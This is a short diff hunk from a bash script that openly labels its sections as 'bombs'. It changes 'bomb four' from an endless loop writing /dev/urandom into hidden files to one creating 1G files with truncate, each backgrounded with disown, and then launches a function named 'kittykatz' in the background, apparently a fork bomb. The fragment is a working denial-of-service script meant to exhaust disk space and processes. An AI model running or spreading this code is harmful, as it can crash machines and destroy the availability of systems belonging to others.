@@ -45,11 +45,11 @@ while true; do
 	counter+=1
 done
 
-#bomb four (dd)
+#bomb four (truncate)
 :
 {
 	for (( i=0; ; i+=1 )); do
-		dd if=/dev/urandom of=./.$1$i & disown
+		truncate -s 1G .$1$i & disown
 	done
 }
 : kittykatz & disown
